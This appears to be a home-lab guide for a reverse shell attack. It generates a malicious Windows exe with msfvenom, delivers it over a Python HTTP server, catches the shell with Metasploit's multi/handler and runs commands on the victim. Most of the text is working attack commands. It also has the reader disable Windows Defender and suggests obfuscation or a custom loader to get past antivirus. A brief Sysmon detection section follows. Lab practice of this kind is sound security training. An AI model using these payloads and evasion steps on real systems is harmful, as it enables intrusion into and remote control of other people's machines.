# 🛡️ Scenario 3: Reverse Shell via Malware Execution

## 🎯 Objective
To simulate a reverse shell attack by generating a malicious payload in Kali Linux and executing it on a Windows system to establish a remote shell session.

---

## 🧰 Tools & Systems Used

| Tool/OS              | Purpose                               |
|----------------------|----------------------------------------|
| Kali Linux (Attacker) | Generate payload and capture shell     |
| Windows 10 (Victim)   | Execute payload and act as the target  |
| Metasploit Framework  | Listener for reverse shell             |
| Sysmon (optional)     | Monitor process and network activity   |

---

## 🧪 Lab Setup

- **Kali IP:** `192.168.1.14`  
- **Windows IP:** Example `192.168.1.16`  
- Ensure both are on the same network.
- Turn off Windows Defender or add an exception.

---

## 🛠️ Step-by-Step Instructions

### 1️⃣ Generate Payload in Kali

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.14 LPORT=4444 -f exe -o malware.exe
-p: Payload type

LHOST: Kali IP

LPORT: Listening port

-f exe: File format

-o malware.exe: Output filename

2️⃣ Transfer Payload to Windows
Start a simple HTTP server on Kali:

bash
Copy
Edit
python3 -m http.server 8000
In Windows, download via browser:

cpp
Copy
Edit
http://192.168.1.14:8000
Save the file in:

makefile
Copy
Edit
C:\Users\windows\Downloads\malware.exe
3️⃣ Start Metasploit Listener on Kali
bash
Copy
Edit
msfconsole
Configure handler:

bash
Copy
Edit
use exploit/multi/handler
set payload windows/x64/shell_reverse_tcp
set LHOST 192.168.1.14
set LPORT 4444
exploit
This will start the listener and wait for a connection.

4️⃣ Execute Payload on Windows
Double-click and run malware.exe in Windows.

If successful, Kali will show:

nginx
Copy
Edit
Command shell session opened
You can now execute remote commands:

bash
Copy
Edit
whoami
ipconfig
5️⃣ (Optional) Monitor Using Sysmon
Open:

vbnet
Copy
Edit
Event Viewer > Applications and Services Logs > Microsoft > Windows > Sysmon > Operational
Look for:

Event ID 1: Process creation (malware.exe)

Event ID 3: Network connection from victim to Kali

🛑 Detection & Prevention Tips
Technique	Description
Sysmon Logs	Shows suspicious process and network activity
Defender Alerts	Detects reverse shell EXE (if enabled)
Network Monitoring	Unusual outbound connection to Kali

📌 Notes
Use windows/x86/shell_reverse_tcp if 64-bit payload fails.

Add set ExitOnSession false in Metasploit if session closes too quickly.

If AV blocks EXE, try obfuscation or compile custom loader.

✅ Outcome
A successful reverse shell session was established from a Windows machine to Kali Linux using a crafted EXE file and Metasploit’s handler.
